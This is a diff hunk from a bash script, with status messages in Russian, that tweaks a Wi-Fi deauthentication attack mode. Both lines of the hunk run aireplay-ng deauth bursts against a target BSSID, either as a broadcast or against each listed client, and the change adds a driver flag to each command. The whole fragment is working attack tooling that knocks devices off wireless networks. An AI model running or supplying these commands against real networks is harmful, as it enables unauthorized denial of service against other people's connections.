@@ -125,12 +125,12 @@ elif [ "$MODE" == "deauth" ]; then
 				declare -a AIREPLAY_PIDS=()
             			if [ ${#CLIENTS[@]} -eq 0 ]; then
         					echo -e "Широковещательная атака на BSSID: $BSSID...\r"
-         					sudo aireplay-ng -0 10 -a $BSSID $INTERFACE > /dev/null 2>&1 &
+         					sudo aireplay-ng -0 10 -a $BSSID $INTERFACE --ignore-negative-one > /dev/null 2>&1 &
                 			AIREPLAY_PIDS+=($!)
             			else
                 			for CLIENT in "${CLIENTS[@]}"; do
                     			echo -e "Атака на клиента $CLIENT в сети BSSID: $BSSID...\r"
-                    			sudo aireplay-ng -0 10 -a $BSSID -c $CLIENT $INTERFACE > /dev/null 2>&1 &
+                    			sudo aireplay-ng -0 10 -a $BSSID -c $CLIENT $INTERFACE --ignore-negative-one > /dev/null 2>&1 &
                     			AIREPLAY_PIDS+=($!)  
                 			done
             			fi
